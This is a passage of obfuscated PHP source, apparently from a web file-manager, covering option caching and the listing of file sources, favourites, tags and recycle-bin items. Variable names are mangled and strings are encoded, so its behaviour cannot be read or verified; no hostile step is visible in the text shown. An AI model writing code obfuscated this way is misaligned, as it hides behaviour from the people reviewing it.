$ÂË¤É“[106], $ÂË¤É“[1310] => $ÂË¤É“[12], $ÂË¤É“[84] => $îßûúùÊ, $ÂË¤É“[95] => $øİ¼”); } return array($ÂË¤É“[33] => $ÂË¤É“[864], $ÂË¤É“[1310] => $øİ¼”->pathDriver, $ÂË¤É“[84] => $îßûúùÊ, $ÂË¤É“[95] => $øİ¼”); } public static function pathDriverType($¯Âƒî÷”) { return $¯Âƒî÷” ? self::driverType(IO::init($¯Âƒî÷”)) : !1; } public static function pathDriverLocal($ï€öøÚ‹) { $‹êˆÂ£³ =& $_SERVER[ì™ı‰º¯]; $¢Õß¬ñ = $ï€öøÚ‹ ? self::driverType(IO::init($ï€öøÚ‹)) : !1; return $¢Õß¬ñ[$‹êˆÂ£³[33]] == $‹êˆÂ£³[106] ? !0 : !1; } public static function allowCover($§ÉÏà°Ğ, $ÑûõÚÍŒ = true) { $ŠªÜ’¨Ì =& $_SERVER[ì™ı‰º¯]; if (is_string($§ÉÏà°Ğ)) { $§ÉÏà°Ğ = IO::info($§ÉÏà°Ğ); } if (!$§ÉÏà°Ğ || $§ÉÏà°Ğ[$ŠªÜ’¨Ì[33]] == $ŠªÜ’¨Ì[75] || $§ÉÏà°Ğ[$ŠªÜ’¨Ì[76]] <= 100) { return !1; } if (isset($§ÉÏà°Ğ[$ŠªÜ’¨Ì[1317]]) || !$§ÉÏà°Ğ[$ŠªÜ’¨Ì[84]]) { return !1; } if (isset($§ÉÏà°Ğ[$ŠªÜ’¨Ì[202]]) && !$§ÉÏà°Ğ[$ŠªÜ’¨Ì[202]]) { return $§ÉÏà°Ğ; } static $ëŒˆ± õ = false; if (!$ëŒˆ± õ || !$ÑûõÚÍŒ) { $¾Ñº = self::driverType(IO::init($§ÉÏà°Ğ[$ŠªÜ’¨Ì[84]])); $·—†ê = $¾Ñº[$ŠªÜ’¨Ì[95]]; $ëŒˆ± õ = $ŠªÜ’¨Ì[1318]; if ($¾Ñº[$ŠªÜ’¨Ì[33]] == $ŠªÜ’¨Ì[106]) { $ëŒˆ± õ = $ŠªÜ’¨Ì[1319]; } if ($¾Ñº[$ŠªÜ’¨Ì[95]] && isset($¾Ñº[$ŠªÜ’¨Ì[95]]->config[$ŠªÜ’¨Ì[1320]]) && $¾Ñº[$ŠªÜ’¨Ì[95]]->config[$ŠªÜ’¨Ì[1320]]) { $ëŒˆ± õ = $ŠªÜ’¨Ì[1319]; } } return $ëŒˆ± õ == $ŠªÜ’¨Ì[1319] ? !0 : !1; } } goto B´Û¶©‚Ç¬; c¡±šÊÌÀå: class ModelBaseOption extends ModelBase { protected $tableName = ''; protected $jsonField = array(); public function get($î¿œì¦ô = false, $´°òÑè² = '', $ËÚÂÖ›´ = false) { $†‚é€ÚÆ =& $_SERVER[ì™ı‰º¯]; $ğ¿ñÃ–æ = $this->cacheGet($´°òÑè²); $æ£şç›œ = $this->optionDefault($´°òÑè²); $æ£şç›œ = is_array($æ£şç›œ) ? $æ£şç›œ : array(); if (is_array($ğ¿ñÃ–æ)) { $ğ¿ñÃ–æ = array_merge($æ£şç›œ, $ğ¿ñÃ–æ); return $î¿œì¦ô ? isset($ğ¿ñÃ–æ[$î¿œì¦ô]) ? $ğ¿ñÃ–æ[$î¿œì¦ô] : null : $ğ¿ñÃ–æ; } $²¦ïÑ”† = $this->filterWhere(array($†‚é€ÚÆ[33] => $´°òÑè²)); $ğ¿ñÃ–æ = $this->where($²¦ïÑ”†)->select(); $ğ¿ñÃ–æ = array_to_keyvalue($ğ¿ñÃ–æ, $†‚é€ÚÆ[94], $†‚é€ÚÆ[374]); foreach ($ğ¿ñÃ–æ as $”óâÓ·õ => $””øèâ‘) { if ($ËÚÂÖ›´ || in_array($”óâÓ·õ, $this->jsonField)) { $ğ¿ñÃ–æ[$”óâÓ·õ] = json_decode($””øèâ‘, !0); } } $this->cacheSet($´°òÑè², $ğ¿ñÃ–æ); $ğ¿ñÃ–æ = array_merge($æ£şç›œ, $ğ¿ñÃ–æ); return $î¿œì¦ô ? $ğ¿ñÃ–æ[$î¿œì¦ô] : $ğ¿ñÃ–æ; } public function set($†ˆìé, $º§ì€‚Ö = false, $™”İ¹É = '') { $³ó€¤å™ =& $_SERVER[ì™ı‰º¯]; $this->cacheRemove($™”İ¹É); $·®ø®ø¤ = array(); $îÌ®Ûé = is_array($†ˆìé) ? $†ˆìé : array($†ˆìé => $º§ì€‚Ö); foreach ($îÌ®Ûé as $»¾ÊœÛ => $£Öá…§‘) { if (is_array($£Öá…§‘)) { $£Öá…§‘ = json_encode_force($£Öá…§‘); } $this->checkLength($£Öá…§‘, !1, $this->tableName . $³ó€¤å™[4] . $†ˆìé); $£Öá…§‘ = self::textEncode($£Öá…§‘); $îÌ®Ûé = array($³ó€¤å™[33] => $™”İ¹É, $³ó€¤å™[94] => $»¾ÊœÛ, $³ó€¤å™[374] => $£Öá…§‘); $·®ø®ø¤[] = $this->filterWhere($îÌ®Ûé); } if (!$·®ø®ø¤) { return !0; } $Å­‚æ»§ = $this->cacheKey($³ó€¤å™[400]); CacheLock::lock($Å­‚æ»§); $×£Ê†ãè = $this->addAll($·®ø®ø¤, array(), !0); CacheLock::unlock($Å­‚æ»§); return $×£Ê†ãè; } protected function optionDefault($ƒöŠŸ£ø = '') { return !1; } public function setDeep($„‘Ôü, $Ÿ¼©“Ù¶ = false, $±§öÌÄ = '') { $®³‚ßí = explode($_SERVER[ì™ı‰º¯][10], $„‘Ôü); $Ş‰ª†ƒï = $this->get(); array_set_value($Ş‰ª†ƒï, $„‘Ôü, $Ÿ¼©“Ù¶); $this->set($®³‚ßí[0], $Ş‰ª†ƒï[$®³‚ßí[0]], $±§öÌÄ); } public function remove($Áúõ÷¼, $ «“ƒïş = '') { $€äÉ¡ÎÔ =& $_SERVER[ì™ı‰º¯]; $this->cacheRemove($ «“ƒïş); $Ğ‡àòî’ = $this->filterWhere(array($€äÉ¡ÎÔ[94] => $Áúõ÷¼, $€äÉ¡ÎÔ[33] => $ «“ƒïş)); if (is_null($Áúõ÷¼)) { unset($Ğ‡àòî’[$€äÉ¡ÎÔ[94]]); } return $this->where($Ğ‡àòî’)->delete(); } public function cacheSet($µíëıç©, $¼Ï‘ö¿ğ = false) { return Cache::set($this->cacheKey($µíëıç©), $¼Ï‘ö¿ğ); } public function cacheGet($Ÿ¡ú˜ñ) { return Cache::get($this->cacheKey($Ÿ¡ú˜ñ)); } public function cacheRemove($Ñ¹ã¸¬) { return Cache::remove($this->cacheKey($Ñ¹ã¸¬)); } protected function filterWhere($¢¡’¼ş) { return $¢¡’¼ş; } protected function cacheKey($ŞÎ»šÈğ) { return $ŞÎ»šÈğ; } } class SourceListModel extends ModelBase { protected $tableName = "\x69\157\137\x73\157\165\x72\x63\145"; protected $tableMeta = array("\x74\x61\x62\154\x65\x4e\141\x6d\145" => "\x69\x6f\x5f\163\x6f\x75\x72\x63\145\137\155\145\x74\x61", "\155\x65\164\141\x46\x69\x65\154\x64" => "\x73\157\165\x72\x63\x65\x49\x44"); protected $dataAuto = array(array("\155\x6f\144\x69\x66\171\124\151\x6d\145", "\164\x69\x6d\x65", "\x69\x6e\163\145\162\x74", "\x66\x75\156\x63\164\x69\x6f\x6e"), array("\143\x72\145\x61\164\145\x54\151\x6d\x65", "\x74\x69\x6d\145", "\x69\156\x73\x65\x72\164", "\146\x75\156\143\164\x69\157\x6e"), array("\166\x69\x65\x77\124\151\155\145", "\164\151\x6d\145", "\x69\156\x73\145\x72\164", "\x66\165\x6e\143\164\x69\x6f\156")); protected static $cacheSourceInfo = array(); protected static $cachePathInfo = array(); protected static $cacheFileInfo = array(); protected static $cacheChildList = array(); const TYPE_SYSTEM = 0; const TYPE_USER = 1; const TYPE_GROUP = 2; public function listData($ÛÏ¯ä†§) { return $this->listSource(array($_SERVER[ì™ı‰º¯][401] => $ÛÏ¯ä†§)); } public function typeName($±ŸÌñ¤Ñ) { static $ªÂ¬î¦· = array(self::TYPE_SYSTEM => "\x73\171\163\164\x65\155", self::TYPE_USER => "\165\163\145\x72", self::TYPE_GROUP => "\x67\x72\157\x75\x70"); return $ªÂ¬î¦·[$±ŸÌñ¤Ñ . $_SERVER[ì™ı‰º¯][12]]; } public function sourceListInfo($¢ÍëéÎí, $±ÃÓêŞ½ = false) { $ÙßÈ¬ÇÜ =& $_SERVER[ì™ı‰º¯]; $¢ÍëéÎí = $¢ÍëéÎí ? $¢ÍëéÎí : array(); $¢ÍëéÎí = array_filter(array_unique($¢ÍëéÎí)); if (!$¢ÍëéÎí) { return array(); } $ŒşşïØ = $this->where(array($ÙßÈ¬ÇÜ[402] => array($ÙßÈ¬ÇÜ[7], $¢ÍëéÎí)))->select(); $this->_listDataApply($ŒşşïØ, $±ÃÓêŞ½); return array_to_keyvalue($ŒşşïØ, $ÙßÈ¬ÇÜ[402]); } public function pathInfoFilter(&$‰Ì¢Ä‘«) { $±Ÿè»Üâ =& $_SERVER[ì™ı‰º¯]; static $Ğ÷€Ã±÷ = false; static $‚ÉêÏ×ş = false; static $°ÜÆóŸ° = false; if (!$Ğ÷€Ã±÷) { $×‚ÃÈğ£ = $±Ÿè»Üâ[403]; $×‚ÃÈğ£ .= $±Ÿè»Üâ[404]; $×‚ÃÈğ£ .= $±Ÿè»Üâ[405]; $âöÃÊêÃ = $±Ÿè»Üâ[406]; $ÉëŒºî­ = explode($±Ÿè»Üâ[50], $âöÃÊêÃ); $Ğ÷€Ã±÷ = explode($±Ÿè»Üâ[50], $×‚ÃÈğ£); $‚ÉêÏ×ş = array(); foreach ($Ğ÷€Ã±÷ as $äÕ°¦¦ì) { if (in_array($äÕ°¦¦ì, $ÉëŒºî­)) { continue; } $‚ÉêÏ×ş[] = $äÕ°¦¦ì; } $°ÜÆóŸ° = explode($±Ÿè»Üâ[50], $±Ÿè»Üâ[407]); } foreach ($°ÜÆóŸ° as $åËÒîû«) { if (isset($‰Ì¢Ä‘«[$åËÒîû«])) { $‰Ì¢Ä‘«[$åËÒîû«] = intval($‰Ì¢Ä‘«[$åËÒîû«]); } } $‰Ì¢Ä‘«[$±Ÿè»Üâ[84]] = $±Ÿè»Üâ[408] . $‰Ì¢Ä‘«[$±Ÿè»Üâ[402]] . $±Ÿè»Üâ[409]; $‰Ì¢Ä‘«[$±Ÿè»Üâ[33]] = $‰Ì¢Ä‘«[$±Ÿè»Üâ[410]] == 1 ? $±Ÿè»Üâ[75] : $±Ÿè»Üâ[200]; $‰Ì¢Ä‘«[$±Ÿè»Üâ[411]] = $this->typeName($‰Ì¢Ä‘«[$±Ÿè»Üâ[411]]); if ($‰Ì¢Ä‘«[$±Ÿè»Üâ[410]] != 1) { $‰Ì¢Ä‘«[$±Ÿè»Üâ[174]] = $‰Ì¢Ä‘«[$±Ÿè»Üâ[412]]; unset($‰Ì¢Ä‘«[$±Ÿè»Üâ[412]]); } $„¡ÁÒëï = $Ğ÷€Ã±÷; if (isset($‰Ì¢Ä‘«[$±Ÿè»Üâ[413]]) && $‰Ì¢Ä‘«[$±Ÿè»Üâ[413]][$±Ÿè»Üâ[414]] == -1) { $„¡ÁÒëï = $‚ÉêÏ×ş; } $‰Ì¢Ä‘« = array_field_key($‰Ì¢Ä‘«, $„¡ÁÒëï); return $‰Ì¢Ä‘«; } public function listUserFav() { $Ä˜˜Áºˆ =& $_SERVER[ì™ı‰º¯]; $Âïü‰Ë„ = Model($Ä˜˜Áºˆ[415])->listData(); $‡Èû‹‘ = array_filter_by_field($Âïü‰Ë„, $Ä˜˜Áºˆ[33], $Ä˜˜Áºˆ[416]); $‡Èû‹‘ = array_to_keyvalue($‡Èû‹‘, $Ä˜˜Áºˆ[12], $Ä˜˜Áºˆ[84]); if ($‡Èû‹‘) { $öçúÓ–Œ = $this->listSource(array($Ä˜˜Áºˆ[417] => array($Ä˜˜Áºˆ[418], $‡Èû‹‘))); } $öçúÓ–Œ = array_to_keyvalue($öçúÓ–Œ[$Ä˜˜Áºˆ[369]], $Ä˜˜Áºˆ[402]); foreach ($Âïü‰Ë„ as &$Ì°¥äúø) { $Ì°¥äúø = array($Ä˜˜Áºˆ[419] => $Ì°¥äúø[$Ä˜˜Áºˆ[399]], $Ä˜˜Áºˆ[420] => $Ì°¥äúø[$Ä˜˜Áºˆ[32]], $Ä˜˜Áºˆ[421] => $Ì°¥äúø[$Ä˜˜Áºˆ[84]], $Ä˜˜Áºˆ[422] => $Ì°¥äúø[$Ä˜˜Áºˆ[33]], $Ä˜˜Áºˆ[423] => $Ì°¥äúø[$Ä˜˜Áºˆ[201]], $Ä˜˜Áºˆ[424] => $Ì°¥äúø[$Ä˜˜Áºˆ[85]]); if ($Ì°¥äúø[$Ä˜˜Áºˆ[33]] == $Ä˜˜Áºˆ[416] && $öçúÓ–Œ[$Ì°¥äúø[$Ä˜˜Áºˆ[84]]]) { $Ì°¥äúø[$Ä˜˜Áºˆ[87]] = $öçúÓ–Œ[$Ì°¥äúø[$Ä˜˜Áºˆ[84]]]; } } unset($Ì°¥äúø); return $Âïü‰Ë„; } public function listUserTag($İ’Ã¥¿³) { $é—úéí³ =& $_SERVER[ì™ı‰º¯]; if ($İ’Ã¥¿³ && !is_array($İ’Ã¥¿³)) { $İ’Ã¥¿³ = array($İ’Ã¥¿³); } $‡ˆ±Ñğ¸ = Model($é—úéí³[425])->listData(); $¼ªŠº´È = array(); $æ™’¶Íæ = array(); foreach ($‡ˆ±Ñğ¸ as $Ğİ¤¨éµ) { $›²‰Šå = $Ğİ¤¨éµ[$é—úéí³[84]]; if (!$›²‰Šå) { continue; } if (!isset($æ™’¶Íæ[$›²‰Šå])) { $æ™’¶Íæ[$›²‰Šå] = array(); } $æ™’¶Íæ[$›²‰Šå][] = $Ğİ¤¨éµ[$é—úéí³[426]]; $¼ªŠº´È[$Ğİ¤¨éµ[$é—úéí³[84]]] = $Ğİ¤¨éµ; } $¸ÉÈöÛ = array(); $ÎßÀ¾û÷ = array(); $–è—ÅÇö = array(); foreach ($æ™’¶Íæ as $ÉâÔ—ËÕ => $Îµ‚¾íß) { $Û˜Çî¿â = !0; if (!$İ’Ã¥¿³) { $¸ÉÈöÛ[] = $ÉâÔ—ËÕ; continue; } foreach ($İ’Ã¥¿³ as $Ú¡å¡É×) { if (!in_array($Ú¡å¡É×, $Îµ‚¾íß)) { $Û˜Çî¿â = !1; break; } } if (!$Û˜Çî¿â) { continue; } if (!is_numeric($ÉâÔ—ËÕ)) { $ÖÆïÜª“ = $¼ªŠº´È[$ÉâÔ—ËÕ]; $Ó˜êÀßÒ = array($é—úéí³[32] => $ÖÆïÜª“[$é—úéí³[32]], $é—úéí³[84] => $ÖÆïÜª“[$é—úéí³[84]], $é—úéí³[33] => $ÖÆïÜª“[$é—úéí³[33]], $é—úéí³[87] => array($é—úéí³[427] => 1), $é—úéí³[202] => !0); if ($ÖÆïÜª“[$é—úéí³[33]] == $é—úéí³[200]) { $–è—ÅÇö[] = $Ó˜êÀßÒ; } if ($ÖÆïÜª“[$é—úéí³[33]] == $é—úéí³[75]) { $ÎßÀ¾û÷[] = $Ó˜êÀßÒ; } continue; } $¸ÉÈöÛ[] = $ÉâÔ—ËÕ; } if ($¸ÉÈöÛ) { $®ëÅÉ = $this->listSource(array($é—úéí³[417] => array($é—úéí³[418], $¸ÉÈöÛ))); } $®ëÅÉ = $®ëÅÉ ? $®ëÅÉ : array($é—úéí³[82] => array(), $é—úéí³[83] => array()); $®ëÅÉ[$é—úéí³[82]] = array_merge($®ëÅÉ[$é—úéí³[82]], $ÎßÀ¾û÷); $®ëÅÉ[$é—úéí³[83]] = array_merge($®ëÅÉ[$é—úéí³[83]], $–è—ÅÇö); if (isset($®ëÅÉ[$é—úéí³[366]]) && count($¸ÉÈöÛ) == $®ëÅÉ[$é—úéí³[366]][$é—úéí³[367]]) { return $®ëÅÉ; } $öœìüñ = array(); $çèÀ¶ˆÊ = array_to_keyvalue($®ëÅÉ[$é—úéí³[82]], $é—úéí³[12], $é—úéí³[402]); $Ÿ‘­èÇ = array_to_keyvalue($®ëÅÉ[$é—úéí³[83]], $é—úéí³[12], $é—úéí³[402]); $çı€ö¢Á = array_merge($Ÿ‘­èÇ, $çèÀ¶ˆÊ); foreach ($¸ÉÈöÛ as $›²‰Šå) { if (!in_array($›²‰Šå, $çı€ö¢Á)) { $öœìüñ[] = $›²‰Šå; } } if ($öœìüñ) { Model($é—úéí³[428])->removeBySource($öœìüñ); } return $®ëÅÉ; } public function listUserRecycle() { $¾Ø ãğ =& $_SERVER[ì™ı‰º¯]; $ê£äÍ¼é = Model($¾Ø ãğ[429])->listData(); if (!$ê£äÍ¼é) { return array(); } $ø¹»¢¾É = array($¾Ø ãğ[417] => array($¾Ø ãğ[418], $ê£äÍ¼é), $¾Ø ãğ[430] => 1); return $this->listSource($ø¹»¢¾É); } public function listSource($Åßúæ, $•äæÍê = 3000, $õşà©È = false) { $ÁŒ¿Ú¹˜ =& $_SERVER[ì™ı‰º¯]; if (!isset($Åßúæ[$ÁŒ¿Ú¹˜[431]])) { $Åßúæ[$ÁŒ¿Ú¹˜[431]] = 0; } if (isset($Åßúæ[$ÁŒ¿Ú¹˜[432]]) && $Åßúæ[$ÁŒ¿Ú¹˜[432]] == $ÁŒ¿Ú¹˜[198]) { $Åßúæ[$ÁŒ¿Ú¹˜[412]] = array($ÁŒ¿Ú¹˜[331], $ÁŒ¿Ú¹˜[433]); } $¹Ë¥¡›Ù = $ÁŒ¿Ú¹˜[434]; $æî¬¹—¯ = $this->field($¹Ë¥¡›Ù)->_makeOrder()->where($Åßúæ)->selectPage($•äæÍê); $this->_listPageCheck($æî¬¹—¯, $¹Ë¥¡›Ù, $Åßúæ); $this->_listDataApply($æî¬¹—¯[$ÁŒ¿Ú¹˜[369]], $õşà©È); $this->_listMake($æî¬¹—¯); return $æî¬¹—¯; } private function _listPageCheck(&$Âã§ü, $º¹Ï¼Áğ, $ÃîÆ‡œ) { $€´Äş‘ =& $_SERVER[ì™ı‰º¯]; if (!is_array($Âã§ü[$€´Äş‘[366]])) { return; } $¸ÄÖÑ€§ = $Âã§ü[$€´Äş‘[366]]; if ($¸ÄÖÑ€§[$€´Äş‘[368]] <= 1) { return; } if ($¸ÄÖÑ€§[$€´Äş‘[367]] >= 100000) { return; } if (Model($€´Äş‘[435])->get($€´Äş‘[436]) != $€´Äş‘[437]) { return; } $º¹Ï¼Áğ = str_replace(array($€´Äş‘[53], $€´Äş‘[342], $€´Äş‘[231]), $€´Äş‘[12], $º¹Ï¼Áğ); $º¹Ï¼Áğ = $€´Äş‘[438] . str_replace($€´Äş‘[50], $€´Äş‘[439], $º¹Ï¼Áğ) . $€´Äş‘[440]; $º¯²­Ÿ” = $€´Äş‘[441]; $º¯²­Ÿ” = $º¯²­Ÿ” . $€´Äş‘[442]; $¡‰úïøØ = $¸ÄÖÑ€§[$€´Äş‘[363]] * ($¸ÄÖÑ€§[$€´Äş‘[353]] - 1) . $€´Äş‘[50] . $¸ÄÖÑ€§[$€´Äş‘[363]]; $ğ¬ô¿ó = $this->_makeOrder(!0); $Ë…÷õç˜ = $€´Äş‘[438] . str_replace($€´Äş‘[50], $€´Äş‘[439], $ğ¬ô¿ó[0]); if (strpos($Ë…÷õç˜, $€´Äş‘[443])) { $Ë…÷õç˜ = str_replace($€´Äş‘[443], $€´Äş‘[444], $Ë…÷õç˜); } else { $Ë…÷õç˜ .= $€´Äş‘[445] . $ğ¬ô¿ó[1]; } $ÑúôìàÊ = array(); foreach ($ÃîÆ‡œ as $˜ËßÉˆ‡ => $¹Æ´ƒê) { $ÑúôìàÊ[$€´Äş‘[438] . $˜ËßÉˆ‡] = $¹Æ´ƒê; } $this->alias($€´Äş‘[446])->field($º¹Ï¼Áğ)->limit($¡‰úïøØ)->order($Ë…÷õç˜); $í¿ê¾¸† = $this->join($º¯²­Ÿ”)->where($ÑúôìàÊ)->select(); if ($í¿ê¾¸†) { $Âã§ü[$€´Äş‘[369]] = $í¿ê¾¸†; } } protected function _makeOrder($»óÑ¦‡ = false) { $¿Û„—ä¬ =& $_SERVER[ì™ı‰º¯]; $ë¿­šû = Model($¿Û„—ä¬[447])->get($¿Û„—ä¬[448]); $•·ßÛ¡… = Model($¿Û„—ä¬[447])->get($¿Û„—ä¬[449]); $ üäîÓ = array($¿Û„—ä¬[450] => $¿Û„—ä¬[451], $¿Û„—ä¬[452] => $¿Û„—ä¬[453]); $äıôòóé = array($¿Û„—ä¬[32] => $¿Û„—ä¬[32], $¿Û„—ä¬[76] => $¿Û„—ä¬[76], $¿Û„—ä¬[174] => $¿Û„—ä¬[412], $¿Û„—ä¬[454] => $¿Û„—ä¬[454], $¿Û„—ä¬[455] => $¿Û„—ä¬[456], $¿Û„—ä¬[201] => $¿Û„—ä¬[201], $¿Û„—ä¬[85] => $¿Û„—ä¬[85]); $åÕ•ç´ = Input::get($¿Û„—ä¬[457], $¿Û„—ä¬[7], $ë¿­šû, array_keys($äıôòóé)); $Æò–ÑĞ† = Input::get($¿Û„—ä¬[458], $¿Û„—ä¬[7], $•·ßÛ¡…, array_keys($ üäîÓ)); if (!in_array($åÕ•ç´, array_keys($äıôòóé))) { $åÕ•ç´ = $¿Û„—ä¬[32]; } if (!in_array($Æò–ÑĞ†, array_keys($ üäîÓ))) { $åÕ•ç´ = $¿Û„—ä¬[450]; } if ($åÕ•ç´ == $¿Û„—ä¬[32]) { } $÷ãÄºÏ¶ = $¿Û„—ä¬[459] . $äıôòóé[$åÕ•ç´] . $¿Û„—ä¬[53] . $ üäîÓ[$Æò–ÑĞ†]; $÷ãÄºÏ¶ = rtrim(trim($÷ãÄºÏ¶), $¿Û„—ä¬[50]); if ($»óÑ¦‡) { return array($÷ãÄºÏ¶, $ üäîÓ[$Æò–ÑĞ†]); } return $this->order($÷ãÄºÏ¶); } protected function _listDataApplyItem($¹ì·ï×“, $áŒŞ¬º¼ = false) { $öÉœ´Ş = array($¹ì·ï×“); $this->_listDataApply($öÉœ´Ş, $áŒŞ¬º¼); return $öÉœ´Ş[0]; } protected function _listDataApply(&$ëŒÍâ¥¸, $¡Ü»©™ = false) { $Ûú¹‰äÑ =& $_SERVER[ì™ı‰º¯]; if (!$ëŒÍâ¥¸) { $ëŒÍâ¥¸ = array(); return; } $»ê°³êœ = array_to_keyvalue($ëŒÍâ¥¸, $Ûú¹‰äÑ[12], $Ûú¹‰äÑ[402]); $»ê°³êœ = array_unique($»ê°³êœ); $this->_listSourceCache($ëŒÍâ¥¸); if (!$¡Ü»©™) { $this->_listAppendMeta($ëŒÍâ¥¸, $»ê°³êœ); $this->_listAppendFileMeta($ëŒÍâ¥¸, $»ê°³êœ); $this->_listAppendChildren($ëŒÍâ¥¸, $»ê°³êœ); } $this->_listAppendPath($ëŒÍâ¥¸); $this->_listAppendAuth($ëŒÍâ¥¸); $this->_listAppendSourceInfo($ëŒÍâ¥¸, $»ê°³êœ); $this->_listAppendUser($ëŒÍâ¥¸); $this->_listFilterInfo($ëŒÍâ¥¸, $¡Ü»©™); $this->_listAppendAuthSecret($ëŒÍâ¥¸); } protected function _listSourceCache($çâ†¯Ÿß) { $Ä½³˜±… =& $_SERVER[ì™ı‰º¯]; foreach ($çâ†¯Ÿß as $‹«û©­¬) { self::$cacheSourceInfo[$Ä½³˜±…[460] . $‹«û©­¬[$Ä½³˜±…[402]]] = $‹«û©­¬; } } protected function _listFilterInfo(&$˜…„¥¤í, $’Å¥³ƒÁ = false) { $õÊ¶ÓÎ =& $_SERVER[ì™ı‰º¯]; foreach ($˜…„¥¤í as &$Ù¹‰¾ê) { $Ù¹‰¾ê = $this->pathInfoFilter($Ù¹‰¾ê); self::$cachePathInfo[$õÊ¶ÓÎ[461] . intval($’Å¥³ƒÁ) . $õÊ¶ÓÎ[386] . $Ù¹‰¾ê[$õÊ¶ÓÎ[402]]] = $Ù¹‰¾ê; } unset($Ù¹‰¾ê); } protected function _listMake(&$ÅîŞÆÚª) { $ƒÆëƒ¼™ =& $_SERVER[ì™ı‰º¯]; $ÅîŞÆÚª[$ƒÆëƒ¼™[82]] = array(); $ÅîŞÆÚª[$ƒÆëƒ¼™[83]] = array(); foreach ($ÅîŞÆÚª[$ƒÆëƒ¼™[369]] as $á€÷áğû) { $§›¹³Ô‡ = $á€÷áğû[$ƒÆëƒ¼™[410]] == 1 ? $ƒÆëƒ¼™[82] : $ƒÆëƒ¼™[83]; $ÅîŞÆÚª[$§›¹³Ô‡][] = $á€÷áğû; } unset($ÅîŞÆÚª[$ƒÆëƒ¼™[369]]); } protected function _listAppendMeta(&$•óú„Ğ, $æóÊ¤øº) { $ïä™¶Îí =& $_SERVER[ì™ı‰º¯]; $İşû ˜ = array($ïä™¶Îí[417] => array($ïä™¶Îí[418], $æóÊ¤øº)); $¦ŒêÎ¦ş = Model($ïä™¶Îí[462])->field($ïä™¶Îí[463])->where($İşû ˜)->select(); if (!$¦ŒêÎ¦ş) { return; } $œ„ŠÁêÅ = array($ïä™¶Îí[464], $ïä™¶Îí[465], $ïä™¶Îí[444]); $áÕ†“ôÈ = array(); foreach ($¦ŒêÎ¦ş as $ÎÀ•½ÇÌ) { if (!isset($áÕ†“ôÈ[$ÎÀ•½ÇÌ[$ïä™¶Îí[402]]])) { $áÕ†“ôÈ[$ÎÀ•½ÇÌ[$ïä™¶Îí[402]]] = array(); } if (in_array($ÎÀ•½ÇÌ[$ïä™¶Îí[94]], $œ„ŠÁêÅ)) { continue; } $áÕ†“ôÈ[$ÎÀ•½ÇÌ[$ïä™¶Îí[402]]][$ÎÀ•½ÇÌ[$ïä™¶Îí[94]]] = $ÎÀ•½ÇÌ[$ïä™¶Îí[374]]; } foreach ($•óú„Ğ as &$È§îŒûˆ) { $È§îŒûˆ[$ïä™¶Îí[466]] = !1; if (isset($áÕ†“ôÈ[$È§îŒûˆ[$ïä™¶Îí[402]]])) { $È§îŒûˆ[$ïä™¶Îí[466]] = $áÕ†“ôÈ[$È§îŒûˆ[$ïä™¶Îí[402]]]; } if ($this->fileIsLock($È§îŒûˆ) && $È§îŒûˆ[$ïä™¶Îí[413]]) { $ëä¡Ü‰ = AuthModel::AUTH_EDIT | AuthModel::AUTH_REMOVE; $È§îŒûˆ[$ïä™¶Îí[413]][$ïä™¶Îí[414]] = AuthModel::authDisable($È§îŒûˆ[$ïä™¶Îí[413]][$ïä™¶Îí[414]], $ëä¡Ü‰); $È§îŒûˆ[$ïä™¶Îí[413]][$ïä™¶Îí[467]][$ïä™¶Îí[413]] = $È§îŒûˆ[$ïä™¶Îí[413]][$ïä™¶Îí[414]]; } } unset($È§îŒûˆ); } protected function _listAppendFileMeta(&$Òëèõ¼, $ŞªË³ş•) { $—²ªá¦ñ =& $_SERVER[ì™ı‰º¯]; $õßÇÚ¯ş = array_to_keyvalue($Òëèõ¼, $—²ªá¦ñ[12], $—²ªá¦ñ[468]); $õßÇÚ¯ş = array_filter(array_unique($õßÇÚ¯ş)); if (!$õßÇÚ¯ş) { return; } $à²ıú½Â = array($—²ªá¦ñ[469] => array($—²ªá¦ñ[418], $õßÇÚ¯ş)); $£Å·ÏÇº = $—²ªá¦ñ[470]; $Ì†ôĞÙ = Model($—²ªá¦ñ[471])->field($£Å·ÏÇº)->where($à²ıú½Â)->select(); $Ì†ôĞÙ = array_to_keyvalue($Ì†ôĞÙ, $—²ªá¦ñ[468]); $ÚâŸÅã = Model($—²ªá¦ñ[472])->field($—²ªá¦ñ[473])->where($à²ıú½Â)->select(); $ÚâŸÅã = $ÚâŸÅã ? $ÚâŸÅã : array(); $¥…í‡—Ş = array(); foreach ($ÚâŸÅã as $“Ò‚ì¨Á) { if (!isset($¥…í‡—Ş[$“Ò‚ì¨Á[$—²ªá¦ñ[468]]])) { $¥…í‡—Ş[$“Ò‚ì¨Á[$—²ªá¦ñ[468]]] = array(); } $¥…í‡—Ş[$“Ò‚ì¨Á[$—²ªá¦ñ[468]]][$“Ò‚ì¨Á[$—²ªá¦ñ[94]]] = $“Ò‚ì¨Á[$—²ªá¦ñ[374]]; } foreach ($Òëèõ¼ as &$öï€ÃœÚ) { $öò«˜ïà = $öï€ÃœÚ[$—²ªá¦ñ[468]]; if (!$öò«˜ïà || !is_array($Ì†ôĞÙ[$öò«˜ïà])) { continue; } $éñïĞÒ = $Ì†ôĞÙ[$öò«˜ïà]; $éñïĞÒ[$—²ªá¦ñ[76]] = $öï€ÃœÚ[$—²ªá¦ñ[76]]; $éñïĞÒ[$—²ªá¦ñ[32]] = $öï€ÃœÚ[$—²ªá¦ñ[32]]; if (!isset(self::$cacheFileInfo[$—²ªá¦ñ[474] . $öò«˜ïà])) { self::$cacheFileInfo[$—²ªá¦ñ[474] . $öò«˜ïà] = array_merge(array(), $éñïĞÒ); } unset($Ì†ôĞÙ[$öò«˜ïà][$—²ªá¦ñ[84]]); $§¼‰‰şÀ = is_array($¥…í‡—Ş[$öò«˜ïà]) ? $¥…í‡—Ş[$öò«˜ïà] : array(); $öï€ÃœÚ[$—²ªá¦ñ[170]] = array_merge($§¼‰‰şÀ, $Ì†ôĞÙ[$öò«˜ïà]); if (isset($öï€ÃœÚ[$—²ªá¦ñ[170]][$—²ªá¦ñ[169]])) { $öï€ÃœÚ[$—²ªá¦ñ[169]] = json_decode($öï€ÃœÚ[$—²ªá¦ñ[170]][$—²ªá¦ñ[169]], !0); unset($öï€ÃœÚ[$—²ªá¦ñ[170]][$—²ªá¦ñ[169]]); } } unset($öï€ÃœÚ); } protected function _listAppendSourceInfo(&$‚¡ÏÂº×, $Œ±´ì•) { $ğù¦óÔÂ =& $_SERVER[ì™ı‰º¯]; $¶ÃÙ¬ø = Model($ğù¦óÔÂ[475])->listData(); $Áşç‚¼ = Model($ğù¦óÔÂ[425])->listData(); 